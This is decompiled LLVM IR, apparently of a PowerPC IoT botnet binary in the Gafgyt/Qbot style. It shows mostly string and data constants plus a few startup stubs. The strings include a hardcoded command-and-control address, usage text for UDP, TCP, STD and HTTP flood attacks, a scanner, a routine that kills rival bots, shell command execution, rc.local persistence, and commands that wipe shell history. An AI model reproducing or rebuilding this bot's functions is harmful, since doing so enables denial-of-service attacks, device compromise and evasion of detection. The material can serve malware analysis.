@global_var_100147c4.379 = constant [4 x i8] c"x86\00"
@global_var_100147c8.380 = constant [5 x i8] c"i686\00"
@global_var_100147d0.381 = constant [4 x i8] c"ppc\00"
@global_var_100147d4.382 = constant [5 x i8] c"i586\00"
@global_var_100147dc.383 = constant [8 x i8] c"jackmy*\00"
@global_var_100147e4.384 = constant [8 x i8] c"hackmy*\00"
@global_var_100147ec.385 = constant [5 x i8] c"arm*\00"
@global_var_100147f4.386 = constant [3 x i8] c"b1\00"
@global_var_100147f8.387 = constant [3 x i8] c"b2\00"
@global_var_100147fc.388 = constant [3 x i8] c"b3\00"
@global_var_10014800.389 = constant [3 x i8] c"b4\00"
@global_var_10014804.390 = constant [3 x i8] c"b5\00"
@global_var_10014808.391 = constant [3 x i8] c"b6\00"
@global_var_1001480c.392 = constant [3 x i8] c"b7\00"
@global_var_10014810.393 = constant [3 x i8] c"b8\00"
@global_var_10014814.394 = constant [3 x i8] c"b9\00"
@global_var_10014818.395 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1001482c.396 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_10014838.397 = constant [10 x i8] c"dvrHelper\00"
@global_var_10014844.398 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1001484c.399 = constant [5 x i8] c"FEUB\00"
@global_var_10014854.400 = constant [9 x i8] c"FTUdftui\00"
@global_var_10014860.401 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1001486c.402 = constant [6 x i8] c"jhUOH\00"
@global_var_10014874.403 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_10014880.404 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1001488c.405 = constant [10 x i8] c"kmyx86_64\00"
@global_var_10014898.406 = constant [10 x i8] c"lolmipsel\00"
@global_var_100148a4.407 = constant [8 x i8] c"RYrydry\00"
@global_var_100148ac.408 = constant [5 x i8] c"tel*\00"
@global_var_100148b4.409 = constant [9 x i8] c"TwoFace*\00"
@global_var_100148c0.410 = constant [9 x i8] c"UYyuyioy\00"
@global_var_100148cc.411 = constant [5 x i8] c"wget\00"
@global_var_100148d4.412 = constant [7 x i8] c"x86_64\00"
@global_var_100148dc.413 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_100148e8.414 = constant [5 x i8] c"xxb*\00"
@global_var_100148f4.415 = constant i32 822083584
@global_var_100148f8.416 = constant i32 838860800
@global_var_100148fc.417 = constant i32 855638016
@global_var_10014900.418 = constant i32 872415232
@global_var_10014904.419 = constant i32 889192448
@global_var_10014908.420 = constant i32 905969664
@global_var_1001490c.421 = constant i32 922746880
@global_var_10014910.422 = constant i32 939524096
@global_var_10014914.423 = constant i32 956301312
@global_var_10014918.424 = constant [3 x i8] c"10\00"
@global_var_1001491c.425 = constant [3 x i8] c"11\00"
@global_var_10014920.426 = constant [3 x i8] c"12\00"
@global_var_10014924.427 = constant [3 x i8] c"13\00"
@global_var_10014928.428 = constant [3 x i8] c"14\00"
@global_var_1001492c.429 = constant [3 x i8] c"15\00"
@global_var_10014930.430 = constant [3 x i8] c"16\00"
@global_var_10014934.431 = constant [3 x i8] c"17\00"
@global_var_10014938.432 = constant [3 x i8] c"18\00"
@global_var_1001493c.433 = constant [3 x i8] c"19\00"
@global_var_10014940.434 = constant [3 x i8] c"20\00"
@global_var_10014944.435 = constant [6 x i8] c"hackz\00"
@global_var_1001494c.436 = constant [5 x i8] c"bin*\00"
@global_var_10014954.437 = constant [5 x i8] c"gtop\00"
@global_var_1001495c.438 = constant [5 x i8] c"ftp*\00"
@global_var_10014964.439 = constant [6 x i8] c"tftp*\00"
@global_var_1001496c.440 = constant [7 x i8] c"botnet\00"
@global_var_10014974.441 = constant [8 x i8] c"swatnet\00"
@global_var_1001497c.442 = constant [8 x i8] c"ballpit\00"
@global_var_10014984.443 = constant [8 x i8] c"fucknet\00"
@global_var_1001498c.444 = constant [9 x i8] c"cracknet\00"
@global_var_10014998.445 = constant [8 x i8] c"weednet\00"
@global_var_100149a0.446 = constant [7 x i8] c"gaynet\00"
@global_var_100149a8.447 = constant [9 x i8] c"queernet\00"
@global_var_100149b4.448 = constant [8 x i8] c"ballnet\00"
@global_var_100149bc.449 = constant [5 x i8] c"unet\00"
@global_var_100149c4.450 = constant [7 x i8] c"yougay\00"
@global_var_100149cc.451 = constant [7 x i8] c"sttftp\00"
@global_var_100149d4.452 = constant [7 x i8] c"sstftp\00"
@global_var_100149dc.453 = constant [7 x i8] c"sbtftp\00"
@global_var_100149e4.454 = constant [6 x i8] c"btftp\00"
@global_var_100149ec.455 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_100149f8.456 = constant [6 x i8] c"bruv*\00"
@global_var_10014a00.457 = constant [5 x i8] c"IoT*\00"
@global_var_10028024.458 = global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100147b0.376, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100147b8.377, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100147c0.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100147c4.379, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100147c8.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100147d0.381, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100147d4.382, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100147d4.382, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100147dc.383, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100147e4.384, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100147ec.385, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100147f4.386, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100147f8.387, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100147fc.388, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014800.389, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014804.390, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014808.391, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1001480c.392, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014810.393, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014814.394, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10014818.395, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001482c.396, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014838.397, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014844.398, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001484c.399, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014854.400, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014860.401, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001486c.402, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014874.403, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014880.404, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001488c.405, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014898.406, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100147b0.376, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100147b8.377, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100148a4.407, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100148ac.408, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100148b4.409, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100148c0.410, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100148cc.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100148d4.412, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100148dc.413, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100148e8.414, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100148f0.19, i32 0, i32 0), i8* bitcast (i32* @global_var_100148f4.415 to i8*), i8* bitcast (i32* @global_var_100148f8.416 to i8*), i8* bitcast (i32* @global_var_100148fc.417 to i8*), i8* bitcast (i32* @global_var_10014900.418 to i8*), i8* bitcast (i32* @global_var_10014904.419 to i8*), i8* bitcast (i32* @global_var_10014908.420 to i8*), i8* bitcast (i32* @global_var_1001490c.421 to i8*), i8* bitcast (i32* @global_var_10014910.422 to i8*), i8* bitcast (i32* @global_var_10014914.423 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014918.424, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1001491c.425, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014920.426, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014924.427, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014928.428, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1001492c.429, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014930.430, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014934.431, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014938.432, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1001493c.433, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014940.434, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014944.435, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001494c.436, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014954.437, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001495c.438, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014964.439, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001496c.440, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014974.441, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001497c.442, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014984.443, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001498c.444, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014998.445, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100149a0.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100149a8.447, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100149b4.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100149bc.449, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100149c4.450, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100149cc.451, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100149d4.452, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100149dc.453, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100149e4.454, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100149ec.455, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100149f8.456, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014a00.457, i32 0, i32 0)]
@global_var_10015fb0.463 = constant i32 570425344
@global_var_10015fb4.464 = constant [22 x i8] c"history -c;history -w\00"
@global_var_10015fcc.465 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_10015fec.466 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1001602c.467 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1001606c.468 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_100160ac.469 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1001613c.470 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_10016174.471 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_10016194.472 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_100161ac.473 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_10016004.481 = constant [6 x i8] c"close\00"
@global_var_1001600c.482 = constant [11 x i8] c"keep-alive\00"
@global_var_10016018.483 = constant [7 x i8] c"accept\00"
@global_var_10016220.487 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_10009f18.488 = constant i32 939524096
@global_var_10009f90.489 = constant [3 x i8] c"8`\00"
@global_var_10016260.490 = constant [6 x i8] c"PONG!\00"
@global_var_1000a058.491 = constant i32 1207963208
@global_var_10016268.492 = constant [6 x i8] c"TABLE\00"
@global_var_10016270.493 = constant [3 x i8] c"%d\00"
@global_var_1000a0a8.494 = constant i32 1207963128
@global_var_10016274.495 = constant [8 x i8] c"SCANNER\00"
@global_var_1001627c.496 = constant [4 x i8] c"OFF\00"
@global_var_100285e0.497 = local_unnamed_addr global i32 0
@global_var_10016280.498 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_10016294.499 = constant [3 x i8] c"ON\00"
@global_var_10016298.500 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_1000a20c.501 = constant [3 x i8] c"8`\00"
@global_var_100162b4.502 = constant [8 x i8] c"REMOVER\00"
@global_var_100162bc.503 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_1000a288.504 = constant [3 x i8] c"8`\00"
@global_var_100162dc.505 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_100162e8.506 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_1000a2f0.507 = constant i32 1207962544
@global_var_100162fc.508 = constant [4 x i8] c"UDP\00"
@global_var_10016300.509 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1000a468.510 = constant i32 1207962168
@global_var_1000a610.511 = constant [3 x i8] c"8`\00"
@global_var_1000a618.512 = constant [3 x i8] c"8`\00"
@global_var_1000a674.513 = constant [3 x i8] c"8`\00"
@global_var_10016374.514 = constant [4 x i8] c"TCP\00"
@global_var_10016378.515 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1000a7ac.516 = constant i32 1207961332
@global_var_1000a900.517 = constant [3 x i8] c"8`\00"
@global_var_1000a908.518 = constant [3 x i8] c"8`\00"
@global_var_1000a960.519 = constant [3 x i8] c"8`\00"
@global_var_10016434.520 = constant [5 x i8] c"HTTP\00"
@global_var_1000aa8c.521 = constant [3 x i8] c"8`\00"
@global_var_1000aa94.522 = constant [3 x i8] c"8`\00"
@global_var_1000ab64.523 = constant [3 x i8] c"8`\00"
@global_var_1001643c.524 = constant [4 x i8] c"STD\00"
@global_var_10016440.525 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1000abf8.526 = constant i32 1207960232
@global_var_1000aca0.527 = constant [3 x i8] c"8`\00"
@global_var_1000aca8.528 = constant [3 x i8] c"8`\00"
@global_var_1000acf0.529 = constant [3 x i8] c"8`\00"
@global_var_1001645c.530 = constant [9 x i8] c"KILLATTK\00"
@global_var_10016468.531 = constant [11 x i8] c"Killed %d.\00"
@global_var_1000ae54.532 = constant i32 1207959584
@global_var_10016474.533 = constant [13 x i8] c"None Killed.\00"
@global_var_10016484.534 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_1002856c.535 = local_unnamed_addr global i32 -1
@global_var_10014a08.536 = constant [19 x i8] c"159.89.176.175:114\00"
@global_var_10028568.537 = global [19 x i8]* @global_var_10014a08.536
@global_var_1000af84.538 = constant i32 939524762
@global_var_10016490.539 = constant [8 x i8] c"8.8.8.8\00"
@global_var_10016498.540 = constant [16 x i8] c"/proc/net/route\00"
@global_var_100164a8.541 = constant [11 x i8] c"\0900000000\09\00"
@global_var_1000b288.542 = constant i32 939524096
@global_var_100285c0.543 = global i32 0
@global_var_1000b2dc.544 = constant i32 1207959564
@global_var_100164b4.545 = constant [6 x i8] c"ROOTS\00"
@global_var_100164bc.546 = constant i32 0
@global_var_1000b3c0.547 = constant [3 x i8] c"8`\00"
@global_var_1000b3e0.548 = constant [3 x i8] c"8`\00"
@global_var_1000b400.549 = constant i32 939524096
@global_var_100164c0.550 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1912602624
@global_var_100164d8.552 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_100164e8.553 = constant i32 788529152
@global_var_100164ec.554 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1000b51c.555 = constant i32 1207959620
@global_var_100164f4.556 = constant i32 1627389952
@global_var_1000b5c4.557 = constant i32 1207959576
@global_var_1000b5d0.558 = constant i32 1207959564
@global_var_1000b5e0.559 = constant i32 1207962721
@global_var_1000b60c.560 = constant [3 x i8] c"8`\00"
@global_var_100164f8.561 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1000b660.562 = constant i32 1207959576
@global_var_1000b678.563 = constant i32 1207963621
@global_var_1000b688.564 = constant [3 x i8] c"8`\00"
@global_var_1000b694.565 = constant i32 1207959556
@global_var_10016508.566 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_1000b6fc.567 = constant i32 939524096
@global_var_10016514.568 = constant [5 x i8] c"PONG\00"
@global_var_1000ba40.569 = constant i32 1207960788
@global_var_1001651c.570 = constant [4 x i8] c"DUP\00"
@global_var_10016520.571 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_10016534.572 = constant [3 x i8] c"SH\00"
@global_var_10016538.573 = constant [8 x i8] c"%s 2>&1\00"
@global_var_10016540.574 = constant [3 x i8] c"%s\00"
@global_var_1000bd58.575 = constant [3 x i8] c"8`\00"
@global_var_1000bd88.576 = constant [3 x i8] c"8`\00"
@global_var_1000bd90.577 = constant i32 939524097
@global_var_10016544.578 = constant i32 536870912
@global_var_1000bfcc.579 = constant i32 1207959564
@global_var_1000c368.580 = constant i32 1207959560
@global_var_10028600.581 = local_unnamed_addr global i32 0
@global_var_1000c6d8.582 = constant i32 939524118
@global_var_10028578 = external local_unnamed_addr global i32
@global_var_10028610.583 = global i32 0
@global_var_10010ad0.584 = constant [3 x i8] c"8`\00"
@global_var_10028258.585 = global i32 0
@global_var_100285e8.586 = local_unnamed_addr global i32 0
@global_var_100285ec.587 = local_unnamed_addr global i32 0
@global_var_1000c928.588 = constant i32 1207965629
@global_var_1000cb10.589 = constant i32 1207960120
@global_var_1002859c.590 = local_unnamed_addr global i32 2
@global_var_10028240.591 = global i32 0
@global_var_10028598.592 = global i32* bitcast (i16* @global_var_10028270.307 to i32*)
@global_var_1000cd44.593 = constant i32 1207959560
@global_var_1000cd94.594 = constant [3 x i8] c" c\00"
@global_var_1000cdb0.595 = constant [3 x i8] c" c\00"
@global_var_10016b48.596 = constant i32 0
@global_var_1000d04c.597 = constant i32 1207961092
@global_var_1000d178.598 = constant i32 1207960768
@global_var_10016b7c.599 = constant i32 269488136
@global_var_10016b60.600 = constant [6 x i8] c"(nil)\00"
@global_var_10016b68.601 = constant [7 x i8] c"(null)\00"
@global_var_10016b70.602 = constant i32 721431808
@global_var_1000d5d4.603 = constant i32 939524096
@global_var_10016bfc.604 = constant i32 65793
@global_var_10016be4.605 = constant i32 524293
@global_var_10016bdc.606 = constant [8 x i8] c" +0-#'I\00"
@global_var_10016b84.607 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_10016bc4.608 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_10016bb8.609 = constant i32 67343
@global_var_10016bb7.610 = constant i32 50331911
@global_var_10016ba8.611 = constant i32 268435461
@global_var_10016b98.612 = constant i32 520093701
@global_var_1000df90.613 = constant [3 x i8] c"8a\00"
@global_var_1000e2b8.614 = constant i32 1207959708
@global_var_1000e360.615 = constant i32 1207959612
@global_var_1000e4ac.616 = constant i32 939589631
@global_var_1000e560.617 = constant i32 939524118
@global_var_10016c18.618 = constant [8 x i8] c"Success\00"
@global_var_10016c08.619 = constant [15 x i8] c"Unknown error \00"
@global_var_100178b6.620 = constant i32 1
@global_var_100285ac.621 = local_unnamed_addr global i32* @global_var_100178b6.620
@global_var_100285f0.622 = global i32 0
@global_var_1002e650.623 = global i32 0
@global_var_1002e82c.624 = global i32 0
@global_var_1002e660.625 = global i32 0
@global_var_10028538.626 = global i32 0
@global_var_1002861c.627 = local_unnamed_addr global i32 0
@global_var_1002e918.628 = global i32 0
@global_var_1000f2fc.629 = constant [3 x i8] c"8`\00"
@global_var_1000f3e0.630 = constant i32 939524098
@global_var_1000f420.631 = constant [3 x i8] c"8`\00"
@global_var_1000f628.632 = constant i32 939524118
@global_var_1000f6b0.633 = constant i32 939524118
@global_var_1002e870.634 = global i32 0
@global_var_1002e840.635 = global i32 0
@global_var_100285a0 = external global i32
@global_var_1002e8f0.638 = global i32 0
@global_var_1000f90c.639 = constant i32 939524108
@global_var_1000f9a4.640 = constant [3 x i8] c"8`\00"
@global_var_1000fa50.641 = constant [3 x i8] c"8`\00"
@global_var_1000fd78.642 = constant i32 1207959640
@global_var_1000fdb4.643 = constant i32 1207959580
@global_var_10028468.644 = global i32 0
@global_var_10028480 = external global i32
@global_var_100284a0.646 = global i32 -1726662223
@global_var_10028488.647 = local_unnamed_addr global i32* @global_var_100284a0.646
@global_var_10028484.648 = global i32* @global_var_100284a0.646
@global_var_10017774.649 = constant i32 0
@global_var_100100cc.650 = constant i32 939524118
@global_var_1001779c.651 = constant [8 x i8] c"/bin/sh\00"
@global_var_100177a4.652 = constant [3 x i8] c"sh\00"
@global_var_100177a8.653 = constant [3 x i8] c"-c\00"
@global_var_10010420.654 = constant [3 x i8] c"8`\00"
@global_var_10010634.655 = constant i32 939524130
@global_var_1002851c.656 = global i32 0
@global_var_100285f4.657 = local_unnamed_addr global i32 0
@global_var_100106c8.658 = constant i32 1207960437
@global_var_100285fc.659 = local_unnamed_addr global i32 0
@global_var_10028000.660 = global i32 -1
@global_var_10028604.661 = local_unnamed_addr global i32 0
@global_var_10028608.662 = local_unnamed_addr global i32 0
@global_var_100177ac.663 = constant [10 x i8] c"/dev/null\00"
@global_var_1002860c.664 = local_unnamed_addr global i32 0
@global_var_100285f8.665 = local_unnamed_addr global i32 0
@global_var_10010de8.666 = constant i32 939524096
@global_var_10010e04.667 = constant i32 939524096
@global_var_10028630.668 = local_unnamed_addr global i32 0
@global_var_10028614.669 = global i32 0
@global_var_100111c0.670 = constant i32 939524180
@global_var_100114dc.671 = constant i32 939524105
@global_var_10017ae0.672 = constant [4 x i8] c"inf\00"
@global_var_10017ae3.674 = constant i32 4804166
@global_var_10017af0.675 = constant i32 771763200
@global_var_1002e858.677 = global i32 0
@global_var_10028618.678 = local_unnamed_addr global i32 0
@global_var_10012490.680 = constant i32 1207960848
@global_var_10028620.681 = local_unnamed_addr global i32 0
@global_var_10017b40.682 = constant i32 771751936
@global_var_1002e908.683 = global i32 0
@global_var_10012580.684 = constant [3 x i8] c"8a\00"
@global_var_1001258c.685 = constant i32 939524097
@global_var_10012660.686 = constant i32 939524097
@global_var_10012734.687 = constant i32 939524097
@global_var_10012760.688 = constant i32 939524100
@global_var_10012840.689 = constant i32 1207959684
@global_var_100129bc.690 = constant i32 939589631
@global_var_10017b5c.691 = constant i32 1912602624
@global_var_10017b48.692 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_10017b60.693 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_10017b78.694 = constant [11 x i8] c"nameserver\00"
@global_var_10017b84.695 = constant [7 x i8] c"domain\00"
@global_var_10017b8c.696 = constant [7 x i8] c"search\00"
@global_var_10012cf4.697 = constant i32 1207959568
@global_var_10012cfc.698 = constant i32 939524099
@global_var_10028550.699 = global i32 0
@global_var_10012e5c.700 = constant i32 939524129
@global_var_10028624.701 = local_unnamed_addr global i32 0
@global_var_10012ed0.702 = constant [3 x i8] c"8`\00"
@global_var_10012f08.703 = constant i32 939524129
@global_var_10028628.704 = local_unnamed_addr global i32 0
@global_var_1002862c.705 = local_unnamed_addr global i32 0
@global_var_100132e4.706 = constant i32 939524171
@global_var_10013394.707 = constant i32 939524105
@global_var_10013730.708 = constant [3 x i8] c"8`\00"
@global_var_10017ba8.709 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_10013928.710 = constant [3 x i8] c"9 \00"
@global_var_10013934.711 = constant i32 939524193
@global_var_1001399c.713 = constant i32 939524101
@global_var_10013a88.714 = constant i32 939524124
@global_var_10013b00.715 = constant i32 1207960116
@global_var_10013b18.716 = constant i32 939524105
@global_var_10013c90.717 = constant [3 x i8] c"9 \00"
@global_var_10017bbc.718 = constant [3 x i8] c"%x\00"
@global_var_10013d1c.719 = constant i32 939524124
@global_var_10013d40.720 = constant i32 939524193
@global_var_10017bc0.721 = constant [11 x i8] c"/etc/hosts\00"
@global_var_10017bcc.722 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1001442c.723 = constant i32 1207959560
@global_var_100144c4.724 = constant i32 939589631
@global_var_10028004.725 = global i32 0
@global_var_10028634.1 = local_unnamed_addr global i8 0
@global_var_100285cb.54 = local_unnamed_addr global i8 0
@global_var_100285cc.55 = local_unnamed_addr global i8 0
@global_var_10028270.307 = global i16 288
@global_var_100282c0.308 = global i16 272
@global_var_10028534.679 = local_unnamed_addr global i16 1
@global_var_100164d4.551 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_10028634.1, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002801c.3 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002801c.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002801c.3 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_10028634.1, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_10028634.1, { 1, 0 }
